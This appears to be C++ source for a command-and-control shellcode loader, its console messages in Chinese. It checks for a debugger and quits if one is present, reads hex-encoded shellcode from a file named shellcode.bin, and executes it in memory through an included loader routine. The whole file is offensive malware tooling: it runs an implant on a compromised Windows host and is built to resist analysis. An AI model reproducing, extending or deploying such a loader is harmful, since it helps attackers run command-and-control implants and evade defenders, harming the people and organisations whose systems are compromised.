#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include "anti_debug.h"
#include "memory_loader.h"

std::vector<unsigned char> hex_to_bytes(const std::string& hex) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        unsigned char byte = (unsigned char)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

int main() {
    SetConsoleOutputCP(CP_UTF8);
    std::cout << "========================================" << std::endl;
    std::cout << "  C2 加载器 v2.1 (工程安全加固版)  " << std::endl;
    std::cout << "========================================" << std::endl;

    std::cout << "[*] 正在进行环境检测..." << std::endl;
    if (IsDebuggerAttached()) {
        std::cerr << "[!] 警告：检测到调试器！程序退出。" << std::endl;
        return 1; 
    }
    std::cout << "[+] 环境安全，未发现调试器。" << std::endl;

    std::cout << "[*] 正在读取 shellcode.bin..." << std::endl;
    std::ifstream file("shellcode.bin", std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "[-] 错误: 找不到 shellcode.bin 文件，请检查运行目录。" << std::endl;
        return 1;
    }

    std::string hex_str((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    if (hex_str.empty()) {
        std::cerr << "[-] 错误: shellcode.bin 文件为空。" << std::endl;
        return 1;
    }

    std::string clean_hex;
    for (char c : hex_str) {
        if (c != '\n' && c != '\r' && c != ' ' && c != '\t') {
            clean_hex += c;
        }
    }
    
    if (clean_hex.length() % 2 != 0) {
        std::cerr << "[-] 错误: Shellcode 十六进制长度不合法（奇数）。" << std::endl;
        return 1;
    }

    std::vector<unsigned char> shellcode = hex_to_bytes(clean_hex);
    std::cout << "[+] Shellcode 读取成功，大小: " << shellcode.size() << " 字节" << std::endl;

    std::cout << "[*] 开始执行..." << std::endl;
    if (ExecuteShellcode(shellcode.data(), shellcode.size())) {
        std::cout << "[+] 加载器执行完毕。" << std::endl;
    } else {
        std::cerr << "[-] 错误: 内存加载或执行失败。" << std::endl;
    }

    return 0;
}